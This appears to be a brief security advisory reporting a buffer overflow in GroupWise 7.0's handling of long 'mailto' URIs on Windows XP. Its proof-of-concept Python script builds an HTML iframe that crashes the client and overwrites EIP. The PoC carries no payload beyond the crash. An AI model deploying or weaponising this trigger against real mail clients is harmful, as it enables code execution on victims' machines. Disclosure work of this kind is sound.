PRODUCT: GroupWise 7.0
OS: Windows Xp

The scheme "mailto" is vulnerable if one takes as default mail client to 
GroupWise, the fault is to implement the scheme followed by an extensive 
argument and this causes the buffer overflow. This brings the consequence that 
can overwrite the EIP and is able to execute arbitrary code. The result with a 
debbuger us what reveals. 

Access violation when executing [41414141] 

What power is that vulnerability to attach a html file which is included in an 
iframe with the scheme badly formed runs only watch.

proof of concept

#!/usr/bin/python

a = "<iframe src='mailto:"
a += "A" * 1530
a += "\x61\x61\x61\x61"
a += "' width='320' height='300' scrolling='yes' name='content'></iframe>"

file = open("test.html", "w")
file.write(a)
file.close()

greetings!

Juan Pablo Lopez Yacubian